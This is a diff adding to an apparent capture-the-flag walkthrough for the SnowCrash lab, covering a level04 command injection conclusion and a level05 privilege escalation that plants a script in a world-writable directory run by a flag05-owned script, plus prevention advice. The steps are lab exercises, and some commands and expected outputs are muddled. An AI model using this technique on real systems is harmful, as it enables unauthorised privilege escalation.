@@ -288,3 +288,68 @@ like below:
         system("/usr/bin/echo", $y);
     }
 ```
+#### Conclusion:
+- By exploiting the command injection vulnerability in the `level04.pl` script, we can execute arbitrary commands on the server with the privileges of the user flag04, which allows us to get the flag for level05 and progress through the CTF challenge. 
+- This highlights the importance of properly sanitizing user input and avoiding the use of dangerous functions that can lead to command injection vulnerabilities, especially when dealing with web applications that can be accessed by untrusted users.
+
+### Level05:
+- Swap to the user level05 and enter the password which is the flag for level04:
+```bash
+    su level05
+    # enter the password: the result of getflag stored in level04/flag
+```
+- There is no file in the home directory of the user level05, but we can see that there is a process running with the name `level05`:
+```bash
+    RESULT=$(find / -user flag05 2>/dev/null)
+    echo $RESULT
+```
+- The output will be something like this:
+    - /usr/sbin/openarenaserver 
+    - /rofs/usr/sbin/openarenaserver
+
+```bash
+    level05@SnowCrash:~$ cat $RESULT
+    #!/bin/sh
+
+    for i in /opt/openarenaserver/* ; do
+            (ulimit -t 5; bash -x "$i")
+            rm -f "$i"
+    done
+    cat: /rofs/usr/sbin/openarenaserver: Permission denied
+```
+- This script is executed with the privileges of the user flag05, and it executes all the scripts in the directory `/opt/openarenaserver/` with a time limit of 5 seconds for each script. 
+- The script also removes each script after executing it, which means that we can potentially inject our own scripts into this directory and have them executed with the privileges of the user flag05.
+- To exploit this, we can create a malicious script that will be executed by the `openarenaserver` script with the privileges of the user flag05. 
+- We can create a script named `exploit.sh` with the following content:
+```bash
+    #!/bin/bash
+    # This script will be executed with the privileges of the user flag05
+    # We can use it to run the getflag to get the flag for level06
+    echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
+    chmod +x /opt/openarenaserver/exploit.sh
+```
+- Now, we need to wait for the `openarenaserver` script to execute our `exploit.sh` script, which will run the `getflag` command and save the output to `/tmp/flag`.
+- After a few seconds, we can check the contents of `/tmp/flag` to get the flag for level06:
+```bash
+    cat /tmp/flag
+    # The output will be the flag for level06 which is in the file `level05/flag`
+```
+#### Prevention:
+- To prevent this type of vulnerability, the `openarenaserver` script should not execute scripts from a directory (a public directory) that is writable by untrusted users, or it should properly sanitize the scripts before executing them.
+- Additionally, it should use a more secure method for executing commands, such as `execve()` instead of `system()`, which does not invoke a shell and therefore reduces the risk of command injection.
+- It is also important to ensure that the directory where the scripts are located has proper permissions set to prevent unauthorized users from adding or modifying scripts.
+```bash
+    # Example of setting proper permissions for the directory:
+    chmod 750 /opt/openarenaserver
+    chown root:flag05 /opt/openarenaserver
+```
+#### Conclusion:
+- By exploiting the vulnerability in the `openarenaserver` script, we can execute arbitrary commands with the privileges of the user flag05, which allows us to get the flag for level06 and progress through the CTF challenge. 
+- This highlights the importance of properly securing directories and scripts that are executed with elevated privileges to prevent potential security vulnerabilities and protect the integrity of the system. 
+
+### Level06:
+- Swap to the user level06 and enter the password which is the flag for level05:
+```bash    
+    su level06
+    # enter the password: the result of getflag stored in level05/flag
+```
